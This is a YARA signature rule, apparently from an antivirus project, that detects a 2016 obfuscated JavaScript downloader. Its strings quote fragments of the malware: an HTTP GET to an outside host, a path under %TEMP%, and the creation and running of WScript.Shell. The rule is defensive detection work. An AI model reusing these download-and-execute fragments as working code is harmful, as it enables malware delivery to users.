rule sig_20160427_819175fbac026b96a598ffa5eb3aad51 {
  meta:
    description = "datamaliciousorder - file 20160427_819175fbac026b96a598ffa5eb3aad51.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b65154130575e1b29cf243bc36302191b781b890e972f5bb3191a6d3d3503416"

  strings:
    $s1  = "function PbxhdFbtmp(KmgjnTvobx, ZgsbaInoap){DdxqwSkbll = DdxqwSkbll * 1; return KmgjnTvobx - ZgsbaInoap;};" fullword ascii
    $s2  = "IaqpbNgjvv[WojelHzdvg](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s3  = "function PdgrtFzqyi() {return YogcwFrvxx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"HdXoYbB" ascii
    $s4  = "function PdgrtFzqyi() {return YogcwFrvxx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"HdXoYbB" ascii
    $s5  = "var YogcwFrvxx = function SbhbqJisuw() {return HotbgRckdc[XgqzjOlzui](\"WScript\"+\".Shell\");}(), KopfgKouwh = 11;" fullword ascii
    $s6  = "var HotbgRckdc = this[\"WScript\"];" fullword ascii
    $s7  = "if (IaqpbNgjvv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function FompeFjabs(){return ZywutKtmlp + \"\";};" fullword ascii
    $s9  = "function NwakuAghkm() {return ((BmoxxWfapz == true) && (BmoxxWfapz == EgnqeGswyo)) ? 1 : DdxqwSkbll;};" fullword ascii
    $s10 = "return PbxhdFbtmp(ExssoXwdut, QdbwhJepnr);" fullword ascii
    $s11 = "function BglswJrchl(BiskkBsjvj){YogcwFrvxx[\"R\"+\"un\"](BiskkBsjvj, DdxqwSkbll, DdxqwSkbll);};" fullword ascii
    $s12 = "var BmoxxWfapz = false;" fullword ascii
    $s13 = "var EgnqeGswyo = false;" fullword ascii
    $s14 = "function OmaewQcwmf(){return XgqzjOlzui;};" fullword ascii
    $s15 = "EgnqeGswyo = true; " fullword ascii
    $s16 = "BmoxxWfapz = true; " fullword ascii
    $s17 = "GobtlQerrg = true;" fullword ascii
    $s18 = "var GprpbHdftm = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function UjafyGccff()" fullword ascii
    $s20 = "var GobtlQerrg = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}